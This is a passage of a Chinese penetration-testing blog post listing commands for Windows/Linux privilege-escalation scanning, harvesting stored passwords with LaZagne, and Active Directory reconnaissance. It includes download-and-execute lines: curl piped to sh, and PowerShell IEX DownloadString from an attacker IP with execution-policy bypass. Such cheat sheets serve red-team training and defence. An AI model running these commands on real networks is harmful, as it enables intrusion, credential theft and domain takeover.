<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">WinPEAS</a></p>
<p>WinPEAS是在PEASS-ng之内的文件功能是在 Windows 环境中搜索可能的权限提升路径，需要目标系统（.Net &gt;= 4.5.2）环境</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 默认运行所有类型的检查，侧重在提权信息收集</span><br><span class="line">winPEASany.exe log=result.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a></p>
<p>linPEAS是在PEASS-ng之内的文件功能实在 Linux 环境中搜索提权可能</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br><span class="line"></span><br><span class="line">./linpeas.sh -a &gt; /dev/shm/linpeas.txt </span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">SharpUp</a></p>
<p>SharpUp 是一个 C# 版本的<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp</a> 工具，可识别本地权限提升路径，需要秒系统（.Net&gt;=3.5）环境</p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行所有漏洞检查，无论完整性级别或组成员资格如何。</span></span><br><span class="line"><span class="keyword">SharpUp.exe </span>audit</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">WES-NG</a></p>
<p>WES-NG 是一个基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供操作系统易受攻击的漏洞列表，包括针对这些漏洞的任何利用。支持 Windows XP 和 Windows 11 之间的每个 Windows 操作系统，包括其 Windows Server 对应版本。</p>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.<span class="keyword">py</span> systeminfo.txt --exploits-<span class="keyword">only</span> --<span class="keyword">hide</span> <span class="string">&quot;Internet Explorer&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Naturehi666/searchall">searchall</a></p>
<p>searchall3.5可以快速搜索服务器中的有关username，passsword,账号，口令的敏感信息还有浏览器的账户密码。</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchall<span class="selector-class">.exe</span> -<span class="selector-tag">p</span> c:/</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p>
<p>LaZagne 是用于获取存储在本地计算机上的大量密码的程序，包括浏览器、Git、SVN、Wifi、Databases 等</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 抓取所有支持软件的密码</span></span><br><span class="line"><span class="attribute">laZagne</span>.exe <span class="literal">all</span></span><br></pre></td></tr></table></figure>



<h2 id="AD域信息收集"><a href="#AD域信息收集" class="headerlink" title="AD域信息收集"></a>AD域信息收集</h2><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 判断域控</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">view</span> /<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看当前登陆域及其域用户</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">config</span> <span class="title">workstation</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 通过<span class="title">DNS</span>服务器来查找域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">echo</span> %<span class="title">USERDOMAIN</span>% &amp;&amp; <span class="title">echo</span> %<span class="title">USERDNSDOMAIN</span>%</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 通过时间服务器来判断域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">time</span> /<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">WMIC</span>来查找域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">wmic</span> <span class="title">computersystem</span> <span class="title">get</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">nltest</span>查找域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">nltest</span> /<span class="title">trusted_domains</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 通过<span class="title">systeminfo</span>来查找域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">systeminfo</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;域 <span class="title">Domain</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 通过<span class="title">ipconfig</span> /<span class="title">all</span>来查找域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">ipconfig</span> /<span class="title">all</span> | <span class="title">findstr</span> &quot;<span class="title">DNS</span> <span class="title">Suffix</span> <span class="title">Search</span> <span class="title">List</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">ipconfig</span> /<span class="title">all</span> | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">C</span>:&quot;<span class="title">DNS</span> <span class="title">Suffix</span> <span class="title">Search</span> <span class="title">List</span>&quot; /<span class="title">C</span>:&quot;<span class="title">Primary</span> <span class="title">Dns</span> <span class="title">Suffix</span>&quot; /<span class="title">C</span>:&quot;<span class="title">IP</span> <span class="title">Address</span>&quot; /<span class="title">C</span>:&quot;<span class="title">DNS</span> <span class="title">Servers</span>&quot; /<span class="title">C</span>:&quot;主 <span class="title">DNS</span> 后缀&quot; /<span class="title">C</span>:&quot;<span class="title">DNS</span> 后缀搜索列表&quot; /<span class="title">C</span>:&quot;<span class="title">IPv4</span> 地址&quot; /<span class="title">C</span>:&quot;<span class="title">DNS</span> 服务器&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 通过<span class="title">SPN</span>查找域控，域控一定会设置<span class="title">SPN</span>，因为票据认证服务需要配置<span class="title">SPN</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">setspn</span> -<span class="title">T</span> 域名 -<span class="title">Q</span> */*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看所有域控制器和域控主机名，或者存在主备域控</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Domain</span> <span class="title">Controllers</span>&quot; /<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 或者开放端口情况</span></span><br><span class="line"><span class="function">53 # <span class="title">DNS</span></span></span><br><span class="line"><span class="function">88 # <span class="title">Kerberos</span>认证服务</span></span><br><span class="line"><span class="function">389 # <span class="title">LDAP</span>(<span class="title">AD</span>=<span class="title">LDAP</span>服务器+<span class="title">LDAP</span>应用)</span></span><br><span class="line"><span class="function">464 # <span class="title">Kerberos</span> 密码修改服务</span></span><br><span class="line"><span class="function">3268 # <span class="title">Global</span> <span class="title">Catalog</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看域内主域控</span></span><br><span class="line"><span class="function"><span class="title">netdom</span> <span class="title">query</span> <span class="title">pdc</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查询域内主机列表</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">domain</span> <span class="title">computers</span>&quot; /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">view</span> /<span class="title">domian:domain_name</span></span></span><br></pre></td></tr></table></figure>

<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><blockquote>
<p>定位主要是定位域控IP</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">ping</span> 查找</span><br><span class="line"><span class="built_in">ping</span> 域名</span><br><span class="line"></span><br><span class="line"># nslookup</span><br><span class="line">nslookup  域名</span><br><span class="line"># 或者用DNS的SRV记录来查找</span><br><span class="line">nslookup -<span class="built_in">type</span>=SRV _ldap._tcp</span><br><span class="line"># 或者用hostname dns解析记录来查询</span><br><span class="line">nslookup -<span class="built_in">type</span>=all_ldap._tcp.dc._msdcs.域名</span><br><span class="line"></span><br><span class="line"># nltest</span><br><span class="line">nltest /DCLIST:域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/netsess/index.htm">Netsess.exe</a></p>
<p>查询每个域控制器，收集所有活动域会话列表。NetSess.exe包含本地Windows函数netsessionenum，该函数用于返回活动会话的IP地址、域账户、会话开始时间和空闲时间。[无需管理员权限]</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定位用户</span></span><br><span class="line">netsess.exe \\DC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># controllers.txt为域控列表，admins.txt为管理员列表</span></span><br><span class="line">FOR /F %i in (controllers.txt) <span class="keyword">do</span> @echo [+] Querying DC %i &amp;&amp; @netsess -h %i <span class="number">2</span>&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) <span class="keyword">do</span> @type sessions.txt | @findstr /I %a</span><br></pre></td></tr></table></figure>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/mubix/netview">Netview.exe</a></p>
<p>netview.exe 是一个枚举工具，使用WinAPI枚举系统、利用NetSessionEnum 找寻登录会话利用NetShareEnum 找寻共享，利用NerWkstaUserEnum 枚举登录的用户。[大部分功能不需要管理员权限]</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f filename.txt：指定要提取主机名列表的文件</span></span><br><span class="line"><span class="deletion">-e filename.txt：指定要排除的主机名的文件</span></span><br><span class="line"><span class="deletion">-o filename.txt：将所有输出重定向到指定文件</span></span><br><span class="line"><span class="deletion">-d domain：指定要提取主机列表的域。如果没有指定，则从当前域中提取</span></span><br><span class="line"><span class="deletion">-g group：指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span></span><br><span class="line"><span class="deletion">-c：对已找到的共享目录/文件的访问权限进行检查</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser.exe</a></p>
<p>PVEFindADUser可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。</p>
<p>运行该工具的计算机需要配置NETFramework2.0环境[需要管理员权限]</p>
</blockquote>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 帮助</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -h</span><br><span class="line"></span><br><span class="line"># 获取目标机上登陆的所有用户，如果指定了用户则显示该用户登陆的计算机</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -current</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -current &lt;Domain\Username&gt;</span><br><span class="line"></span><br><span class="line"># 阻止尝试枚举用户登陆名之前对目录计算机执行ping命令</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -noping    </span><br><span class="line"></span><br><span class="line"># 指定要查询的主机，然后指定以逗号分隔的主机名</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -target</span><br><span class="line"></span><br><span class="line"># 获取目标计算机最后一个登陆用户，如果指定了用户名&lt;Domain\Username&gt;则显示用户上次登陆计算机</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -last</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PVEFindADUser</span>.</span></span>exe -last &lt;Domain\Username&gt;</span><br></pre></td></tr></table></figure>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon.exe</a></p>
<p>Psloggedon可以查看本地登录的用户、域登录的用户以及远程计算机登录的用户[需要管理员权限]</p>
</blockquote>
<blockquote>
<p>所有的pstools第一次运行都会弹框，记得加参数绕过 psloggedon.exe –accepteula</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
</blockquote>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 帮助</span></span><br><span class="line">psloggedon.exe /？</span><br><span class="line"></span><br><span class="line"><span class="meta"># 显示支持的选项</span></span><br><span class="line">psloggedon.exe -</span><br><span class="line"></span><br><span class="line"><span class="meta"># 只显示本地登录，不登陆网络资源登录</span></span><br><span class="line">psloggedon.exe -l</span><br><span class="line"></span><br><span class="line"><span class="meta"># 列出指定计算器的登陆信息</span></span><br><span class="line">psloggedon.exe \\computername</span><br><span class="line"></span><br><span class="line"><span class="meta"># 列出指定用户名登陆的计算机</span></span><br><span class="line">psloggedon.exe &lt;username&gt;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Nmap的<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">NSE脚本</a></p>
<p>如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话。</p>
<p>[无需管理员权限]</p>
</blockquote>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">domain</span>：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span></span><br><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">users</span>：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描</span></span><br><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">shares</span>：遍历远程主机的共享目录</span></span><br><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">processes</span>：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span></span><br><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">sessions</span>：获取域内主机的用户登录会话，查看当前是否有用户登录。</span></span><br><span class="line">smb-os-discovery：收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名，工作组、系统时间等信息</span><br><span class="line"></span><br><span class="line">nmap --script smb-<span class="class"><span class="keyword">enum</span>-<span class="title">sessions</span>.<span class="title">nse</span> -<span class="title">p</span> 445 &lt;<span class="title">host</span>&gt;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">PowerView.PS1</a></p>
<p>powerview 集成在 powersploit 工具包中，是一个收集域信息很好用的脚本。</p>
<p>通常情况下需要过滤，因为真实的域环境中会有大量结果[无需管理员权限]</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地调用</span></span><br><span class="line">powershell.exe -exec bypass -Command <span class="string">&quot;&amp;&#123;Import-Module %userprofile%\desktop\PowerView.ps1; Invoke-StealthUserHunter&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程调用</span></span><br><span class="line">powershell.exe -exec bypass -c <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&#x27;);Invoke-StealthUserHunter&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他功能</span></span><br><span class="line"><span class="section">Get-NetDomain: 获取当前用户所在域的名称</span></span><br><span class="line"><span class="section">Get-NetUser: 获取所有用户的详细信息</span></span><br><span class="line"><span class="section">Get-NetDomainController: 获取所有域控制器的信息</span></span><br><span class="line"><span class="section">Get-NetComputer: 获取域内所有机器的详细信息</span></span><br><span class="line"><span class="section">Get-NetOU: 获取域中的OU信息</span></span><br><span class="line"><span class="section">Get-NetGroup: 获取所有域内组和组成员信息</span></span><br><span class="line"><span class="section">Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息</span></span><br><span class="line"><span class="section">Get-NetShare: 获取当前域内所有网络共享信息</span></span><br><span class="line"><span class="section">Get-NetSession: 获取指定服务器的会话</span></span><br><span class="line"><span class="section">Get-NetRDPSession: 获取指定服务器的远程连接</span></span><br><span class="line"><span class="section">Get-NetProcess: 获取远程主机的进程</span></span><br><span class="line"><span class="section">Get-UserEvent: 获取指定用户的日志</span></span><br><span class="line"><span class="section">Get-ADObiect: 获取活动目录的对象</span></span><br><span class="line"><span class="section">Get-NetGPO: 获取域内所有的组策略对象</span></span><br><span class="line"><span class="section">Get-DomainPolicy: 获取域默认策略或域控制器策略</span></span><br><span class="line"><span class="section">Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限</span></span><br><span class="line"><span class="section">Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户</span></span><br><span class="line"><span class="section">Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/ADModule">ADModule</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用dll导入</span></span><br><span class="line"><span class="built_in">Import-Module</span> D:\ADModule<span class="literal">-master</span>\ADModule<span class="literal">-master</span>\Microsoft.ActiveDirectory.Management.dll <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接导入ActiveDirectory.ps1</span></span><br><span class="line"><span class="built_in">iex</span> (<span class="built_in">new-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.67:8000/Import-ActiveDirectory.ps1&#x27;</span>);<span class="built_in">Import-ActiveDirectory</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载到内存执行</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> Bypass <span class="literal">-C</span> “<span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.67:8000/powerview.ps1&#x27;</span>);<span class="built_in">Get-NetDomainController</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>




<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></p>
<p><code>BloodHound</code>使用可视化图来显示<code>Active Directory</code>环境中隐藏的、通常是无意的关系。</p>
<p>使用BloodHound轻松识别高度复杂的攻击路径，否则这些攻击路径无法快速识别。</p>
</blockquote>
<h3 id="AD数据库获取哈希"><a href="#AD数据库获取哈希" class="headerlink" title="AD数据库获取哈希"></a>AD数据库获取哈希</h3><blockquote>
<p>域控制器数据库在安装时默认位置是 %SystemRoot%\NTDS\ntds.dit，此文件存放着所有域用户密码哈希。ntds.dit 使用 %SystemRoot%\System32\config\SYSTEM 注册表配置中的密钥加密过，无法直接读取。</p>
</blockquote>
<blockquote>
<p> Volume Shadow Copy Service (VSS) 获取数据库</p>
</blockquote>
<blockquote>
<p> VssAdmin 获取数据库</p>
</blockquote>
<blockquote>
<p>VShadow 获取数据库</p>
</blockquote>
<blockquote>
<p> NinjaCopy 获取数据库</p>
</blockquote>
<blockquote>
<p>获取到副本库以后可以用以下四种方法解密</p>
</blockquote>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">QuarkPwDump</span> <span class="string">解密数据库</span></span><br><span class="line"><span class="attr">Secretsdump</span> <span class="string">解密数据库</span></span><br><span class="line"><span class="attr">NtdsAudit</span> <span class="string">解密数据库</span></span><br><span class="line"><span class="attr">Mimikatz</span> <span class="string">解密数据库</span></span><br></pre></td></tr></table></figure>

<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><blockquote>
<p>获取域内用户信息</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取当前域内所有账号</span></span><br><span class="line">net<span class="built_in"> user </span>/domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前域内名为&lt;username&gt;的信息</span></span><br><span class="line">net<span class="built_in"> user </span>&lt;username&gt; /domain</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取域内用户组信息</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询当前域内所有用户组 </span></span><br><span class="line">net<span class="built_in"> group </span>/domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前域内 Computers 组内计算机列表</span></span><br><span class="line">net<span class="built_in"> group </span><span class="string">&quot;Domain Computers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域企业管理员 Admins 用户组内用户</span></span><br><span class="line">net<span class="built_in"> group </span><span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域管理员 Admins 用户组内用户[域管账户]</span></span><br><span class="line">net<span class="built_in"> group </span><span class="string">&quot;Admins&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域密码策略，可以先看密码策略用于爆破</span></span><br><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录本机的域管理员</span></span><br><span class="line">net localgroup Administrators /domain</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用 PowerShell 查询 用户信息</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中DC=域名称,OU=组织单元,CN=公共名称</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Get-ADUser</span>  <span class="literal">-Filter</span> *</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用PowerShell的PowerView.ps1 脚本查询</p>
</blockquote>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前域内所用用户详细信息</span><br><span class="line">powershell -exec bypass <span class="keyword">Import</span>-<span class="keyword">Module</span> .\powerview.ps1;<span class="keyword">Get</span>-NetUser</span><br><span class="line"></span><br><span class="line"># 获取当前域指定用户详细信息</span><br><span class="line">powershell -exec bypass <span class="keyword">Import</span>-<span class="keyword">Module</span> .\powerview.ps1; <span class="keyword">Get</span>-NetUser -Domain &lt;DomainName&gt;</span><br><span class="line"></span><br><span class="line"># 获取当前域指定用户详情信息</span><br><span class="line">powershell -exec bypass <span class="keyword">Import</span>-<span class="keyword">Module</span> .\powerview.ps1; <span class="keyword">Get</span>-NetUser -<span class="keyword">Identity</span> &lt;UserName&gt;</span><br><span class="line"></span><br><span class="line"># 获取指定域的用户名</span><br><span class="line">powershell -exec bypass <span class="keyword">Import</span>-<span class="keyword">Module</span> .\powerview.ps1; <span class="keyword">Get</span>-NetUser -domain &lt;DomainName&gt; | <span class="keyword">Select</span> samaccountname</span><br></pre></td></tr></table></figure>

<h4 id="用户描述信息"><a href="#用户描述信息" class="headerlink" title="用户描述信息"></a>用户描述信息</h4><blockquote>
<p>直接查询详细信息，输出内容较多。可以用管道符配合 select 获取指定属性。</p>
